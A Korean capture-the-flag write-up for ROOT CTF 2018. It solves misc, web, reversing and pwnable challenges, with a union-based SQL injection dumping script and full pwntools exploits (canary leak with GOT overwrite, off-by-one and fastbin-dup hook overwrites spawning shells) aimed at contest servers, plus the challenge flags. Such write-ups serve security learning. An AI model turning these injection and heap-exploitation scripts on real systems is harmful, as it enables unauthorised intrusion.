![Rank](http://file.c2w2m2.com/ctf/writeup/2018ROOT/images/rank.png)
전체   2등
고등부 1등

## 목차

- MISC
  - MIC DROP
  - HubGIT
  - Encoded_Code
  - FindMe!
- WEB
  - Secret_chest
  - Normal_SQLI
- REVERSING
  - ROOT_Process_1
  - ROOT_Process_2
  - ROOT Login
  - CrackMe
- PWNABLE
  - S3CretD00r
  - ROOTapply
  - R00T_SCHool



## MISC

### MIC DROP

 MIC Check 다

Flag : `FLAG{M1c..Dr0p..M1c..Dr0p..Welc0me_T0_R00T_CTF_2018!!}`



### HubGIT

git 파일 받아서 zip 풀고 git log 를 보면

```bash
commit cc7611208282c863e4a9c09c821c8db124050898
Author: root <root@root.com>
Date:   Fri Dec 21 05:34:10 2018 +0900

    FLAGFLAGFLAGFLAGFLAGFLAGFLAGFFFLLL@@@@@@@@GGGG
```

이렇게 되어있다. git checkout cc7611208282c863e4a9c09c821c8db124050898 를 통해서 flag 파일을 가져올 수 있다.

Flag : `FLAG{GIT_8rob1em_7h@t_C4n_b3_50lv3d_in_O63_M1nu7e!}`



### Encoded_Code

Visual Studio 기준으로 짜여있는 코드인데, linux에서 컴파일 하기 위해서 조금 수정하면

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define A 9999
int B(int C);
char* D(long E);
int main(void) {

	char F[A];
	char G[((A - 1) * 8) + 1] = { NULL };
	char *H = { NULL };
	char I[9] = { NULL };
	char J[] = "==";
	char K[] = "00000";
	char L[] = "lksOm9BteESFLuDaNiUho1dwnRG0yc+jAKpXgYrH6xIQPW4vM7q32TbfZC8/5VJz";
	char M[] = "ig7kifWsutu9w3n2w214n3kgLoCHwTiojN==";
	long N[A];
	long O, P, Q, R;
	int S, T;

	scanf("%s", F);

	for (int i = 0; i < A; i++)
		N[i] = B(F[i]);

	for (int i = 0; i < A; i++) {
		if (N[i] != 0) {
			H = D(N[i]);
			strcat(G, H);
		}
	}

	memset(N, 0, A);
	S = 0;
	for (int i = 0; i < strlen(G); i += 6) {
		strncpy(I, G + i, 6);
		if (strlen(I) < 6) {
			T = 3 - (strlen(I) / 2);
			strncat(I, K, 6 - strlen(I));
		}
		O = atoi(I);
		R = 0;
		Q = 1;
		while (O != 0) {
			if (O % 10)
				R += Q;
			O /= 10;
			Q *= 2;
		}
		N[S] = R;
		S++;
	}

	memset(G, 0, ((A - 1) * 8) + 1);
	for (int i = 0; i < S; i++) {
		G[i] = L[N[i]];
	}

	for (int i = S; i < S + T; i++) {
		G[i] = '=';
	}
	printf("%s\n", G);

	if (!strcmp(G, M)) {
		printf("Correct!!!\n");
	}
	else {
		printf("it's not FLAG!!\n");
	}

	return 0;

}

int B(int C) {
	int U;
	int V = 0;
	int W = 1;
	while (C > 0) {
		U = C % 2;
		V += U*W;
		C = C / 2;
		W *= 10;
	}
	return V;
}

char* D(long E) {
	static char X[9] = { NULL };
	char Y[9] = { NULL };
	char Z[((A - 1) * 8) + 1] = { NULL };
			//itoa(E, X, 10);
	sprintf(X,"%ld",E);
			strcpy(Y, X);
			memset(X, 0, 9);
			for (int i = 0; i < (8 - strlen(Y)); i++) {
				X[i] = '0';
			}
			strcat(X, Y);
	return X;
}

```

이렇게 된다. 처음에는 분석하려 했는데, 머리아파서 그냥 한글자씩 브포해서 적당히 맞췄다.

Flag : `FLAG{B4sE_64_Enc0d1Ng_TT}`



### FindMe!

그냥 hxd로 까서 ctrl+f 로 FLAG 찾으니까 바로 나오더라.

Flag : `FLAG{0h_You_Find_IT_!_!}`



## WEB

### Secret_chest

js 코드보면 sessionStorage에 값을 저장한다. 그래서

```javascript
sessionStorage.setItem("lv","100");
```

하고 open 눌러주면 flag가 나온다.

Flag : `FLAG{1!tTle_2sy_3Asy_4l@g}`



### Normal_SQLI

login에서 바로 union based sqli가 가능하다.

이걸로 db 다 긁어봤는데 딱히 플래그로 보이는건 없었다.

```python
import requests

login = 'https://sdhsroot.kro.kr/Normal_SQLI/login.php'
logout = 'https://sdhsroot.kro.kr/Normal_SQLI/logout.php'
main = 'https://sdhsroot.kro.kr/Normal_SQLI/'

cookie = {"PHPSESSID" : "2kdlino8925k7468gtg1g6hl54"}

for i in range(0,100):
    query = "' union select (select table_name from information_schema.tables limit %d,1)-- -" % i
    data = {"id" : query, "pw":"A"}
    requests.post(login, data=data, cookies=cookie)

    req = requests.get(main, cookies=cookie).text
    req = req[req.find('hello')+6:]
    req = req[:req.find("<br>")]

    print req

    requests.get(logout, cookies=cookie)

```

대충 이런식으로 긁었다.

그리고 description을 보니까 pw를 계속 바꾼다는 말이 있어서 혹시나 싶어 돌아가는 쿼리를 뽑아봤다.

`' union select (select info from information_schema.processlist limit 0,1)-- -`

이런식으로 뽑아봤는데, 플래그가 나오더라.

` update prob8_user set pw=md5('FLAG{V3ry_H44444rd_SQL1}') where id='root' or sleep(0.1)`

Flag : `FLAG{V3ry_H44444rd_SQL1}`



## REVERSING

### ROOT_Process_1

![1545622520074](http://file.c2w2m2.com/ctf/writeup/2018ROOT/images/1545622520074.png)

대충 막 이렇게 되어있는데, Very_easy_Reversing!이라는 이름을 가진 window를 찾으면 Correct를 띄우더라.

위에

![1545622561706](http://file.c2w2m2.com/ctf/writeup/2018ROOT/images/1545622561706.png)

테이블 있길래 긁어서 밑에서 하는 연산대로 xor 시켜봤다.

```python
a = "Very_easy_Reversing!"
t = [31,41,66,15,58,50,40,29,23,49,19,21,71,87,65,69,71,11,31,68]

res = []
for i in range(0, len(a)):
	res.append(chr(ord(a[i]) ^ t[i] ))
print ''.join(res)
```

IL0veWInnnAp1236.exe 이게 나오는데, 이게 Flag 더라.

Flag : `FLAG{IL0veWInnnAp1236.exe}`



### ROOT_Process_2

까보면 위에 엄청나게 길게 변수 정의해서 hexray가 안된다.

그냥 함수이름으로 대충 보면 input 받고, 적당히 할당받아서 적당히 뭐 올려서 실행한다.

그리고 실제로도 실행시켜 보면, 프로세스가 하나 더 뜬다. 그러면 저 적당히 할당 받은대를 dump 떠보면 될듯 하다.

![1545623186877](http://file.c2w2m2.com/ctf/writeup/2018ROOT/images/1545623186877.png)

적당히 여기에 bp 를 걸고, 스택을 봐보면

![1545623246741](http://file.c2w2m2.com/ctf/writeup/2018ROOT/images/1545623246741.png)

가 있다. 대략 베이스는 아니까, 메모리 맵 가서 덤프를 뜨자. x96기준으로 그냥 가서 오른쪽 클릭해서 덤프뜰 수 있다.

덤프가 제대로 떠졌으면 ida로 분석이 가능하다. 올려서 봐주면

![1545623442186](http://file.c2w2m2.com/ctf/writeup/2018ROOT/images/1545623442186.png)

간단한 xor 연산을 한다. seed 는 1로 고정임으로 간단하게 코드를 짜서 구해낼 수 있다.

```c
#include <stdio.h>
#include <random>
int main() {
	int ran;
	int table[] = { 0x6F ,0x78 ,0x2E ,0x13 ,0x0C ,0x35 ,0x00 ,0x7A ,0x72 ,0x0F ,0x44 ,0x20 ,0x62 ,0x5A ,0x54 ,0x2E ,0x3E ,0x35 ,0x4E ,0x08 ,0x7B };
	srand(1);
	for (int i = 0; i < 21; i++) {
		printf("%c",table[i] ^ (rand() % 127));
	}
	system("pause");
}
```

Flag : `FLAG{R0oT_1nJec@t1On}`



### ROOT_Login

![1545623556876](http://file.c2w2m2.com/ctf/writeup/2018ROOT/images/1545623556876.png)

메인은 대충 이렇다. 먼저 checkname을 통해서 이름체크를 한다.

![1545623604563](http://file.c2w2m2.com/ctf/writeup/2018ROOT/images/1545623604563.png)

무슨 해괴한 연산을 막 해서 테이블이랑 비교하는데, 이걸 일일히 분석해서 역연산같은걸 했다가는 죽을거같고, 될지도 모르겠다.

그래서 그냥 python으로 루틴을 그대로 베껴 온 다음에, Brute Forcing했다.

```python
import string

def a2b(char):
    res = []
    tmp = bin(ord(char))[2:]
    tmp = tmp.zfill(8)
    for i in tmp:
        res.append("%02d" % int(i))
    return res

def DEBUG(data, name=0):
    if name == 0:
        print '[*] DEBUG : ' + str(data)
    else:
        print '[*] DEBUG %s : ' % name + str(data)

f = [7, 0, 4, 5, 4, 7, 7, 0, 4, 2, 0, 6, 6, 3, 4, 5, 4, 0, 3, 6, 1, 0, 6, 1, 7, 2, 0, 6, 1, 7, 5, 3, 4, 2, 0, 6, 1, 0, 1, 5, 6, 3, 4, 5, 4, 7, 7, 7, 7, 0, 4, 2, 7, 5, 3, 4, 5, 4, 0, 3, 6, 6, 4, 7, 7, 7, 0, 3, 6, 6, 4, 7, 7, 0, 4, 2, 7, 2, 7, 5]
rflag = ''
rtable = string.printable
for q in range(0,11):
    for k in range(0,len(rtable)):
        stack = ['00','00','00','00']
        flag = rflag + rtable[k]
        for i in flag:
            t = a2b(i)
            for j in t:
                stack.append(j)

        #DEBUG(stack, 'STACK')
        tmp = []
        for i in range(4, len(flag)*8 + 4):  

            res1 = int(stack[i-2]) ^ int(stack[i-1]) ^ int(stack[i]) ^ int(stack[i-3]) ^ 1
            res2 = int(stack[i-1]) ^ int(stack[i]) ^ int(stack[i-3]) ^ 1
            res3 = int(stack[i]) ^ 1
            res4 = 0
            
            res = 0
            cnt = 1

            res += (res2) * cnt
            cnt *= 2

            res += (res1) * cnt
            cnt *= 2

            res += (res3) * cnt
            cnt *= 2

            res += (res4) * cnt
            cnt *= 2

            #DEBUG([res1, res2, res3, res4])
            #DEBUG(res, "RES")
            tmp.append(res)

        if tmp == f[0:q*8]:
            rflag += rtable[k]
            print rflag
            break
```

돌려보면 ID 는 `Admin@R00T`가 나온다. 이제 pw를 구하면 끝날 듯 싶다.

![1545623738111](http://file.c2w2m2.com/ctf/writeup/2018ROOT/images/1545623738111.png)

해당 연산인데 문제가 뭐냐면, 우리가 key값을 알지 못한다.  그래서 먼저 key값을 알아와야 한다.

pw를 "0"*64로 보내서 v5값을 0으로 고정시키고나면 genpw, rand, pw 등을 이용해서 key를 유추해낼 수 있다.

```python
from pwn import *
import time
import ctypes
from z3 import *

id = "Admin@R00T"
pw = "0"*64

#p = process('./R00T_Login')
p = remote('222.110.147.52',2018)
p.recvuntil("Current time: ")

p.recvuntil("22 ")
ti = p.recvuntil(' ').split(':')
time_tuple = (2018, 12, 22, int(ti[0]), int(ti[1]), int(ti[2]),2,317,0)
timestamp = int(time.mktime(time_tuple))

timestamp = int(time.time()) #- 60*60*9

libc = ctypes.CDLL('/lib/x86_64-linux-gnu/libc.so.6')
libc.srand(timestamp)

p.recvuntil("Name : ")
p.sendline(id)
p.recvuntil("Password : ")
p.sendline(pw)

p.recvuntil("Generated Password : ")

genpasswd = p.recvline()[:-1]

v11 = 0
k = BitVec('k', 32)
pw = ''
id_c = 0
for i in range(0, 16):
    v4 = ord(id[id_c]) + (ord(id[id_c+1]) << 8)
    v5 = 0
    v6 = libc.rand() & 0x0ffff

    X = (v6 ^ v5 ^ v11) 
    gen = int(genpasswd[4*i:4*(i+1)], 16)
    s= Solver()
    s.add(gen == (v4 ^ (k * (X+1) + X)) )
    s.check()
    data = s.model()[k].as_long()
    pw += '%04x' % (data&0xffff)
    id_c += 1
    if(i == 8):
        id_c = 0
    v11 = gen
print pw

```

근데 문제가 뭐냐면 중복해가 있는듯 싶어서 이 key로 바로 플래그가 안나온다.

```
38F6 99AE 3C54 F4D8 743A D79E DBEA 7DA2 1662 A086 24A2 BB94 0D4E AFB0 71D8 1FF4
0    1     2   3    4     5    6   7    8    9    10   11   12   13   14   15
38F6 99AE 3C54 F4D8 743A D79E DBEA 7DA2 1662 A086 A4A2 3B94 8D4E 2FB0 F1D8 9FF4


38F6 99AE 3C54 F4D8 743A 579E 5BEA FDA2 1662 A086 24A2 BB94 0D4E AFB0 71D8 1FF4
38F6 99AE 3C54 F4D8 743A D79E DBEA 7DA2 9662 2086 A4A2 3B94 8D4E 2FB0 F1D8 9FF4
38F6 99AE 3C54 F4D8 743A D79E DBEA FDA2 1662 A086 24A2 BB94 0D4E AFB0 71D8 1FF4

5cb6 f4ca 5538 6ab2 1aca 5784 ebb8 4d92 c252 c4c6 49c6 d2f8 e326 efda 2398 2fa6
5cb6 f4ca 5538 6ab2 1aca d784 ebb8 4d92 4252 e4c6 49c6 12f8 cb26 efda 6398 b7a6
5cb6 f4ca 5538 6ab2 1aca 1784 ebb8 cd92 4252 c4c6 49c6 d2f8 6326 efda 2398 efa6
5cb6 f4ca b538 6ab2 1aca d784 6bb8 cd92 4252 c4c6 89c6 82f8 6326 1fda 2398 2fa6
5cb6 74ca 5538 eab2 9aca 9784 ebb8 4d92 4252 c4c6 c9c6 d2f8 2326 efda 0398 2fa6
5cb6 f4ca 5538 6ab2 1aca 5784 ebb8 4d92 4252 c4c6 49c6 d2f8 6326 efda e398 6fa6
5cb6 f4ca 5538 eab2 1aca d784 ebb8 4d92 4252 44c6 49c6 52f8 e326 efda a398 2fa6
5cb6 f4ca 5538 6ab2 1aca d784 2bb8 cd92 c252 c4c6 49c6 d2f8 e326 efda 2398 2fa6 
5cb6 f4ca 5538 6ab2 daca 6784 6bb8 cd92 4252 c4c6 49c6 d2f8 e326 6fda 2398 4fa6 
5cb6 f4ca 9538 eab2 1aca d784 ebb8 4d92 4252 c4c6 c9c6 d2f8 6326 efda a398 5fa6
5cb6 f4ca d538 6ab2 1aca d784 ebb8 dd92 4252 c4c6 49c6 d2f8 6326 6fda 2398 2fa6

5cb6 f4ca 5538 6ab2 1aca d784 ebb8 4d92 4252 c4c6 49c6 d2f8 6326 efda 2398 2fa6

5cb6f4ca55386ab21acad784ebb84d924252c4c649c6d2f86326efda23982fa6
```

이런식으로 key 여러개 구해서 적당히 많은거 골라서 몇번 해보면 올바른 key를 구해낼 수 있다.

key 구했으면 pw 구해주면 된다.

```python
from pwn import *
import time
import ctypes
from z3 import *

id = "Admin@R00T"

#p = process('./R00T_Login')

timestamp = int(time.time()) #- 60*60*9

libc = ctypes.CDLL('/lib/x86_64-linux-gnu/libc.so.6')
libc.srand(timestamp)


genpw = "38F699AE3C54F4D8743AD79EDBEA7DA21662A08624A2BB940D4EAFB071D81FF4"
v11 = 0
key = "5cb6f4ca55386ab21acad784ebb84d924252c4c649c6d2f86326efda23982fa6"
#key = "5cb6f4ca55386ab21acad7846bb8cd92c252c4c649c6d2f8e326efda23982fa6"
#key = "559aead08264d5795d3909718cdd05abd49572e84fe55590eef31a88a08fdffd"

pw = ''

id_c = 0
for i in range(0, 16):
    v4 = ord(id[id_c]) + (ord(id[id_c+1]) << 8)
    v6 = libc.rand() & 0x0ffff
    
    v5 = BitVec('v5', 32)
    k = int(key[4*i:4*(i+1)], 16)
    X = (v6 ^ v5 ^ v11) 
    gen = int(genpw[4*i:4*(i+1)], 16)
 #   solve(gen == (v4 ^ (k * (X+1) + X)) )
 #   pause()

    s = Solver()
    s.add(gen == (v4 ^ (k * (X+1) + X)) )
    s.check()
    data = s.model()[v5].as_long()
    if i == 5:
        pw += '%04x' %(data&0xffff)
    else:
        pw += '%04x' %(data&0xffff)
    id_c += 1
    if(i == 8):
        id_c = 0
    v11 = gen

#pw = raw_input(">>> ")[:-1]

p = remote('222.110.147.52',2018)
#p = process('./R00T_Login')

print len(pw)

p.recvuntil("Name : ")
p.sendline(id)
p.recvuntil("Password : ")
p.sendline(pw)

p.interactive()
```

 참고로 시간은 서버시간이 UTC + 00 쓰길래 내 로컬도 시간 바꿔서 했다.

Flag : `FLAG{Wishing_y0u_a_w0nderful_Chr1stmas_f1lled_w1th_j0y_and_laughter!!}`



### CrackMe

대충 분석해 보면

![1545624051224](http://file.c2w2m2.com/ctf/writeup/2018ROOT/images/1545624051224.png)

이렇게 되어있다. string_to_bin은 말 그대로 문자를 binary로 바꾸는거고,

sub_400990에서 뭘 한다음 custom_base64를 하는데, 그냥 table만 바뀌어있는 base64다.

sub_400990에서 뭘 하는지 보면

![1545624134354](http://file.c2w2m2.com/ctf/writeup/2018ROOT/images/1545624134354.png)

연속으로 3개가 같기 전에는 table에서 rand() 한 값을 찾아서 넣어준다. 연속으로 3개가 같아질 경우

![1545624165823](http://file.c2w2m2.com/ctf/writeup/2018ROOT/images/1545624165823.png)

! 를 달고, 갯수를 table에서 찾아서 넣고, 값을 table에서 찾아서 넣는다.



그냥 적당히 decode해주면 된다. base64코드는 https://github.com/gehaxelt/Python-MyBase64 여기서 가져왔다.

```python
#Encoding: UTF-8
import re
import ctypes

#Decode a base64 chiffre
def base64Decode(chiffre):
    alphabet = ['Z', 'Y', 'X', 'W', 'V', 'U', 'T', 'S', 'R', 'Q', 'P','O', 'N', 'M', 'L', 'K', 'J', 'I', 'H', 'G', 'F', 'E','D', 'C', 'B', 'A', 'z', 'y', 'x', 'w', 'v', 'u', 't','s', 'r', 'q', 'p', 'o', 'n', 'm', 'l', 'k', 'j', 'i','h', 'g', 'f', 'e', 'd', 'c', 'b', 'a', '9', '8', '7','6', '5', '4', '3', '2', '1', '0', '+', '/']
    bit_str=""
    text_str=""
    
    #Loop through every char
    for char in chiffre:
        #Ignore characters, which are not in the alphabet. Concatenate the binary representation of alphabet index of char 
        if char in alphabet:
            bin_char = bin(alphabet.index(char)).lstrip("0b")
            bin_char = (6-len(bin_char))*"0" + bin_char
            bit_str += bin_char
    
    #Make 8bit - 2byte brackets
    brackets = re.findall('(\d{8})', bit_str)

    #Decode char binary -> asciii
    for bracket in brackets:
        text_str+=chr(int(bracket,2))

    return text_str

data = '39xs8IzeMEDEsLl/N+ps8yHgRGB9osPSRwD1RwC7QHVdr0xx5qp/fFMCRMFFccMaRGAEcHSEnFVs8w5yI7QlRwDzleMtykO2mbSEqDRvYhfcRwCbi7hsMiJvzbSEebSEzj1yBC9sMomuwHV7K+Zs8ypBUbVdko9oRGzsR+tsMhp8msHV4c2QEP4CGKFsMsps8H7kuclvIBwRRGzRrKyi+akVRwCAIXAAdswNntZ5OIzic1LbHoP/ibd/xdw7FWBsMmfi6VmryjVs8zhSNeZYRGYmRoZmfpskXa8qOrV7IdDQRwCWXL1s8GlpFrSEL/3rRwD0UJCQ6iJs8vG4LDLW2bSEBBeoRwF9eS1sModdQDUnh+cOxBZ8qGts8uhs8CnKKXV7jHSEXFts8yN4RGz7CtJ='
decoded= base64Decode(data)

table = [0x52,0x9,0x6A,0x0D5,0x30,0x36,0x0A5,0x38,0x0BF,0x40,0x0A3,0x9E,0x81,0x0F3,0x0D7,0x0FB,0x7C,0x0E3,0x39,0x82,0x9B,0x2F,0x0FF,0x87,0x34,0x8E,0x43,0x44,0x0C4,0x0DE,0x0E9,0x0CB,0x54,0x7B,0x94,0x32,0x0A6,0x0C2,0x23,0x3D,0x0EE,0x4C,0x95,0x0B,0x42,0x0FA,0x0C3,0x4E,0x8,0x2E,0x0A1,0x66,0x28,0x0D9,0x24,0x0B2,0x76,0x5B,0x0A2,0x49,0x6D,0x8B,0x0D1,0x25,0x72,0x0F8,0x0F6,0x64,0x86,0x68,0x98,0x16,0x0D4,0x0A4,0x5C,0x0CC,0x5D,0x65,0x0B6,0x92,0x6C,0x70,0x48,0x50,0x0FD,0x0ED,0x0B9,0x0DA,0x5E,0x15,0x46,0x57,0x0A7,0x8D,0x9D,0x84,0x90,0x0D8,0x0AB,0x0,0x8C,0x0BC,0x0D3,0x0A,0x0F7,0x0E4,0x58,0x5,0x0B8,0x0B3,0x45,0x6,0x0D0,0x2C,0x1E,0x8F,0x0CA,0x3F,0x0F,0x2,0x0C1,0x0AF,0x0BD,0x3,0x1,0x13,0x8A,0x6B,0x3A,0x91,0x11,0x41,0x4F,0x67,0x0DC,0x0EA,0x97,0x0F2,0x0CF,0x0CE,0x0F0,0x0B4,0x0E6,0x73,0x96,0x0AC,0x74,0x22,0x0E7,0x0AD,0x35,0x85,0x0E2,0x0F9,0x37,0x0E8,0x1C,0x75,0x0DF,0x6E,0x47,0x0F1,0x1A,0x71,0x1D,0x29,0x0C5,0x89,0x6F,0x0B7,0x62,0x0E,0x0AA,0x18,0x0BE,0x1B,0x0FC,0x56,0x3E,0x4B,0x0C6,0x0D2,0x79,0x20,0x9A,0x0DB,0x0C0,0x0FE,0x78,0x0CD,0x5A,0x0F4,0x1F,0x0DD,0x0A8,0x33,0x88,0x7,0x21,0x31,0x0B1,0x12,0x10,0x59,0x27,0x80,0x0EC,0x5F,0x60,0x51,0x7F,0x0A9,0x19,0x0B5,0x4A,0x0D,0x2D,0x0E5,0x7A,0x9F,0x93,0x0C9,0x9C,0x0EF,0x0A0,0x0E0,0x3B,0x4D,0x0AE,0x2A,0x0F5,0x0B0,0x0C8,0x0EB,0x0BB,0x3C,0x83,0x53,0x99,0x61,0x17,0x2B,0x4,0x7E,0x0BA,0x77,0x0D6,0x26,0x0E1,0x69,0x14,0x63,0x55,0x7D,0x0C,0x0C7]
libc = ctypes.CDLL('/lib/x86_64-linux-gnu/libc.so.6')
libc.srand(0x7e2)

tmp = ''
i = 0

print table[106:]

while True:
    if decoded[i] != "!":
        idx = table.index(ord(decoded[i]))
        if libc.rand() & 0xff == idx:
            tmp += '0'
        else:
            tmp += '1'
    else:
        num = table.index(ord(decoded[i+1]))
        value = table.index(ord(decoded[i+2]))

        if libc.rand() & 0xff == value:
            for k in range(num):
                tmp += '0'
        else:
            for k in range(num):
                tmp += '1'

        i += 2

    i +=1
    if (i >= len(decoded)):
        print tmp
        exit(1)
```

010001100100110001000001010001110111101101001001010111110111011100110001011011000110110001011111010001110011000001011111011101000011000001011111010110010011000001110101010111110110110001101001011010110011001101011111010101000110100001100101010111110100011000110001011100100111001101110100010111110101001101101110001100000111011101111101 가 나오는데 이걸 string으로 바꿔주면 된다.

Flag : `FLAG{I_w1ll_G0_t0_Y0u_lik3_The_F1rst_Sn0w}`



## PWNABLE

### S3CretD00r

가위바위보 하는 곳에서 canary를 leak 할 수 있다.

덤으로 libc 3바이트를 구해낼 수 있다.

그리고 admin얻으면 나오는 bof에서 got overwrite를 적당히 해줄 수 있으니까, 덮어서 쓱 하면 된다.

```python
from pwn import *
import ctypes

lib = ctypes.CDLL('/lib/x86_64-linux-gnu/libc.so.6')
lib.srand(0x100)

p = remote('222.110.147.52',2833)#process('./S3CretD00r')
elf = ELF('./S3CretD00r')
libc = elf.libc

p.recvuntil('>> ')
p.sendline('1')

context.log_level='debug'

for i in range(0,15):
    p.recvuntil('>> ')
    com = lib.rand() % 3 + 1
    if com == 1:
        p.sendline('3')
    elif com == 2:
        p.sendline('1')
    else:
        p.sendline('2')

p.recvuntil('>> ')
com = lib.rand() % 3 + 1
if com == 1:
    p.sendline('2')
elif com == 2:
    p.sendline('3')
else:
    p.sendline('1')
pause()
p.recvuntil('>>')
p.sendline('y')

p.recvuntil("[16]")
p.recvline()

leak = ''
for i in range(0,8):
    data = p.recvline()
    data = data[data.find("-> '") + 4:data.rfind("'")]
    leak += data

canary = u64(leak)
leak = ''
for i in range(0,3):
    data = p.recvline()
    data = data[data.find("-> '") + 4:data.rfind("'")]
    leak += data


offset = u64(leak.ljust(8,'\x00'))

print hex(offset)
pause()
p.recvuntil('>> ')
p.sendline('1')


for i in range(0,30):
    p.recvuntil('>> ')
    com = lib.rand() % 3 + 1
    if com == 1:
        p.sendline('3')
    elif com == 2:
        p.sendline('1')
    else:
        p.sendline('2')

p.recvuntil('>>')
p.sendline('n')

p.recvuntil('>>')
p.sendline('2')

p.recvuntil('do.\n')

pay = "A"*(0x30 - 0x10) + p64(canary)
pay += "B"*8 + p64( elf.got['strlen']+0x30 - 8)
pay += p64(0x40125E )



pause()
p.send(pay)

system = offset - 0x5abdd8


p.send("/bin/sh\x00" + p32(system)[:-1])

p.interactive()

```

Flag : `FLAG{B3_G00D_0r_I_W1ll_T3xt_SanTa!}`



### ROOTapply

2개 만들고 한개 지우는걸로 libc leak 이 가능하다. 

그리고 profile 수정에서, 1byte NULL Overflow가 가능한데, 이걸로 context를 아예 다 덮어낼 수 있다.

그러면 Arbitrary write 가 가능해지고, 이걸로 free_hook을 덮어서 쉘 따주면 된다.

```python
from pwn import *


def Apply(school, subject):
    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil(': ')
    p.sendline(school)
    p.recvuntil(': ')
    p.sendline(subject)

def Delete(idx):
    p.recvuntil('> ')
    p.sendline('2')
    sleep(0.1)
    p.sendline(str(idx))

def Edit(idx, data):
    p.recvuntil('> ')
    p.sendline('3')
    sleep(0.1)
    p.sendline(str(idx))
    sleep(0.1)
    p.sendline(data)
    p.recvuntil('success!')

if __name__ == '__main__':
    p = remote('222.110.147.52',9707)#process('./ROOTapply')
    elf = ELF('./ROOTapply')
    libc = elf.libc

    p.recvuntil(': ')
    p.sendline("A")
    p.recvuntil(': ')
    p.sendline("1")

    Apply('AAAA', 'BBBB')
    Apply('CCCC', 'DDDD')

    Delete(0)

    p.recvuntil('> ')
    p.sendline('4')
    p.sendline('0')

    p.recvuntil('School: ')
    leak = u64(p.recv(6).ljust(8,'\x00'))
    libcbase = leak - 0x3c4b78

    log.info("LIBCBASE : 0x%x" % libcbase)
    pause()
    oneshot = libcbase + 0x4526a
    
    p.recvuntil('> ')
    p.sendline('5')
    p.recvuntil(': ')
    p.sendline("A"*16)
    p.sendline('1')
    Apply('/bin/sh','/bin/sh')
    Edit(0, p32(0) + p64(libcbase + libc.symbols['__free_hook'] - 60))
    Edit(3, p64(oneshot))
    p.interactive()
```

Flag : `FLAG{E4SY_0ff-by-0n3!}`



### R00T_SCHool

level1 bof

level2 uaf

level3 fastbin dup

하는 간단한 문제다.

````python
from pwn import *

def wrap(data):
    p.recvuntil('Input: ')
    p.sendline(data)

p = remote('222.110.147.52',1009)#process('./R00T_SCHool')
elf = ELF('./R00T_SCHool')
libc = elf.libc

### LEVEL 1
wrap("A"*(0x30 - 0x20) + "B")


### LEVEL 2
wrap('2')
wrap('1')
wrap("A"*16 + p64(0x400AB2))
wrap('3')

### LEVEL3

## LEAK
wrap('2')
p.recvuntil('idx: ')
p.sendline('0')
p.recvuntil('size: ')
p.sendline('256')
p.recvuntil('data: ')
p.send("A")
wrap('2')
p.recvuntil('idx: ')
p.sendline('1')
p.recvuntil('size: ')
p.sendline('256')
p.recvuntil('data: ')
p.send("A")
wrap('3')
p.recvuntil('idx: ')
p.sendline('0')
p.recvuntil('? ')
p.sendline('0')
wrap('1')
p.recvuntil('idx: ')
p.sendline('0')

leak = u64(p.recv(6).ljust(8,'\x00'))
libcbase = leak - 0x3c4b78
log.info("LIBCBASE : 0x%x" % libcbase)
pause()
oneshot = libcbase + 0x4526a
__malloc_hook = libcbase + libc.symbols['__malloc_hook']

## Attack

wrap('2')
p.recvuntil('idx: ')
p.sendline('0')
p.recvuntil('size: ')
p.sendline('90')
p.recvuntil('data: ')
p.send("A")
wrap('2')
p.recvuntil('idx: ')
p.sendline('1')
p.recvuntil('size: ')
p.sendline('90')
p.recvuntil('data: ')
p.send("A")

wrap('3')
p.recvuntil('idx: ')
p.sendline('0')
p.recvuntil('? ')
p.sendline('0')
wrap('3')
p.recvuntil('idx: ')
p.sendline('1')
p.recvuntil('? ')
p.sendline('0')
wrap('3')
p.recvuntil('idx: ')
p.sendline('0')
p.recvuntil('? ')
p.sendline('0')

wrap('2')
p.recvuntil('idx: ')
p.sendline('0')
p.recvuntil('size: ')
p.sendline('90')
p.recvuntil('data: ')
p.send(p64(__malloc_hook - 0x23))
wrap('2')
p.recvuntil('idx: ')
p.sendline('0')
p.recvuntil('size: ')
p.sendline('90')
p.recvuntil('data: ')
p.send("A")
wrap('2')
p.recvuntil('idx: ')
p.sendline('0')
p.recvuntil('size: ')
p.sendline('90')
p.recvuntil('data: ')
p.send("A")
wrap('2')
p.recvuntil('idx: ')
p.sendline('0')
p.recvuntil('size: ')
p.sendline('90')
p.recvuntil('data: ')
p.send("A"*19 + p64(oneshot))
wrap('2')
p.sendline('0')
p.sendline('0')

p.interactive()
````

Flag : `FLAG{th3_B3st_Hack3r}`
